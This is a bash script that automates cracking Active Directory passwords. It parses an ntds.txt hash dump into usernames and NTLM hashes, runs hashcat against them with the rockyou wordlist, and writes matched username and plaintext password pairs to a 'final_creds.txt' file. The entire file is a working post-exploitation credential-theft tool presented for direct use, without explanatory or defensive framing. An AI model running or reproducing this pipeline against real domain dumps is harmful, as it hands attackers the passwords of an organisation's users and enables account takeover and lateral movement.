#!/bin/bash

NTDS="ntds.txt"
HASHES="hashes.txt"
NTLM="ntlm_only.txt"
CRACKED="cracked.txt"
FINAL="final_creds.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo

# -----------------------------
# Check NTDS
# -----------------------------
if [ ! -f "$NTDS" ]; then
    echo "[!] ntds.txt not found"
    exit 1
fi

# -----------------------------
# Parse NTDS
# -----------------------------
echo "[+] Parsing NTDS.dit dump..."
awk -F: '{print $1, $4}' "$NTDS" > "$HASHES"

echo "[+] Creating NTLM-only hashcat file..."
awk '{print $2}' "$HASHES" > "$NTLM"

echo
echo "=============================="
echo "[✔] NTDS PARSING DONE"
echo "------------------------------"
echo "Generated files:"
echo " - hashes.txt"
echo " - ntlm_only.txt"
echo "=============================="
echo

# -----------------------------
# Check rockyou
# -----------------------------
if [ ! -f "$WORDLIST" ]; then
    echo "[!] rockyou.txt not found"
    echo "[i] Run: sudo gzip -d /usr/share/wordlists/rockyou.txt.gz"
    exit 1
fi

# -----------------------------
# Run hashcat automatically
# -----------------------------
echo "[+] Running hashcat (NTLM + rockyou.txt)..."
hashcat -m 1000 "$NTLM" "$WORDLIST" --quiet

echo "[+] Extracting cracked hashes..."
hashcat -m 1000 "$NTLM" "$WORDLIST" --show > "$CRACKED"

# -----------------------------
# Match usernames ↔ passwords
# -----------------------------
echo "[+] Matching cracked credentials..."

awk '
NR==FNR {
    user[$2] = $1
    next
}
{
    split($0, b, ":")
    if (b[2] != "" && user[b[1]] != "")
        print user[b[1]], b[1] ":" b[2]
}
' "$HASHES" "$CRACKED" > "$FINAL"

echo
echo "=============================="
echo "[🔥] CREDENTIALS READY"
echo "------------------------------"
echo "Output file: final_creds.txt"
echo "=============================="
echo
